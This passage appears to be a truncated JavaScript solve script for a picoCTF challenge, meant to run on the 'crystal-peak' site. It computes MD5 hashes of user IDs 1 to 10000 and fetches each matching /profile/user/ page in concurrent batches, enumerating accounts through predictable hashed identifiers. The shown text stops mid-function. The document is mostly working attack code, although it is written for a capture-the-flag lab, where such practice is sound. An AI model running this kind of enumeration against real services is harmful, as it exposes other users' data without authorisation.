...
// while on the crystal-peak site
...
function md5(string) {
    ...
    var x=ConvertToWordArray(Utf8Encode(string)),a=0x67452301,b=0xEFCDAB89,c=0x98BADCFE,d=0x10325476;
...
// ── Sweep ─────────────────────────────────────────────────────────────────────
const BASE = "http://crystal-peak.picoctf.net:50752/profile/user/";
const GUEST_HASH = "e93028bdc1aacdfb3687181f2031765d";
const MAX = 10000;
const BATCH = 20; // concurrent requests

async function sweep() {
    console.log(`[*] Starting sweep 1-${MAX}...`);
    for (let i = 1; i <= MAX; i += BATCH) {
        const batch = [];
        for (let j = i; j < i + BATCH && j <= MAX; j++) {
            const h = md5(String(j));
            if (h === GUEST_HASH) continue;
            batch.push(
                fetch(BASE + h)
                    .then(r => r.text())
                    .then(text => {
